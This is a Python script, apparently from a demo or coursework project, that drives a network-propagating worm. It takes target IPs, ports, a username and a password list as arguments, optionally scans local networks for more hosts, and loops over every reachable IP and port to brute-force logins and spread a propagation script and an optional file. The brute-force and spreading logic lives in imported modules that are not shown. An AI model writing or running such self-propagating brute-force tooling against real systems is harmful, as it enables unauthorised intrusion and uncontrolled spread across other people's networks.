#!/usr/bin/python3

# Importing logging to safely log sensitive, error or debug info.
import logging
# Importing net_propagation for propagating across the network.
import net_propagation
# Importing file for working with files.
import file
# Importing strings for use of the external strings resources.
import strings
# Importing sys to make OS calls and use OS level utilities.
import sys


def demo():
    """
    This demo function is just for demo purposes.
    """
    # These arguments are passed in by the end user.
    arguments = sys.argv

    # If there is no arguments then just print the help menu and exit.
    if arguments.__len__() == 0:
        net_propagation.exit_and_show_instructions()
        sys.exit(-1)

    # Just initialising this for use later.
    transfer_file = strings.SPACE

    # Validating and assigning values based on arguments passed in.
    valid_values = net_propagation.checking_arguments(arguments)
    # If they are invalid values...
    if valid_values is None:
        # Show the user instructions and exit gracefully.
        net_propagation.exit_and_show_instructions()
        sys.exit(-1)

    # Else...
    else:
        # Assign them...
        ip_list, target_ports, target_username, passwords_filename = \
            valid_values

    # The end user specified a local scan must be executed, the result of the
    # local scan will extend the current ip_list.
    if strings.ARGUMENT_SCAN_LOCAL_NETWORKS in arguments:
        logging.info(strings.PERFORMING_LOCAL_SCAN)
        ip_list = net_propagation.gathering_local_ips(ip_list)

    # Creating the password file.
    password_file = file.File(strings.PWDS_LIST_SHORT)
    try:
        # Here I made sure the user actually gave a valid file for the
        # passwords list. If they have...
        password_file.validate_file_exists()
        # A list of passwords is created.
        password_list = password_file.convert_file_to_list()
    except RuntimeError:
        # File doesn't exist, alert the user and exit gracefully, so
        # they can possibly fix their mistake.
        password_file.file_error_handler()
        sys.exit(-1)

    # If the user wants to transfer a file, this stuff should be done...
    if strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE in arguments:
        try:
            # If it does though we assign the filename to the name out of scope
            # above.
            transfer_file_filename = arguments[arguments.index(
                strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE) + 1]
            # Again making sure the transfer file actually exits, just like
            # the password file above.
            transfer_file = file.File(transfer_file_filename)
            transfer_file.validate_file_exists()
        except RuntimeError:
            # File doesn't exist, throw an error and give the user a chance to
            # try again.
            transfer_file_filename = arguments[arguments.index(
                strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE) + 1]
            transfer_file = file.File(transfer_file_filename)
            transfer_file.file_error_handler()
            sys.exit(-1)

    # Removing duplicate entries in the IP address list, can come from
    # combining local scan with given IP addresses in an ip address file for
    # example. This would be a user error, we're just handling that.
    ip_list = list(dict.fromkeys(ip_list))
    # Removing IPs from the IP list that can't be pinged from the host machine
    # of the script.
    ip_list = net_propagation.remove_unreachable_ips(ip_list)
    # Getting a list of ports by splitting the target ports specified by the
    # user on the comma.
    ports = target_ports.split(strings.COMMA)
    # Cycling through every IP in the IP list...
    for ip in ip_list:
        # And then using all user specified ports against that specific IP...
        for port in ports:
            propagation_script = file.File(strings.DEMO_SCRIPT_FILENAME)
            # Try to spread using services and actions.
            net_propagation.try_action(ip, port, target_username,
                                       password_list, transfer_file.filename,
                                       propagation_script.filename, arguments)


demo()
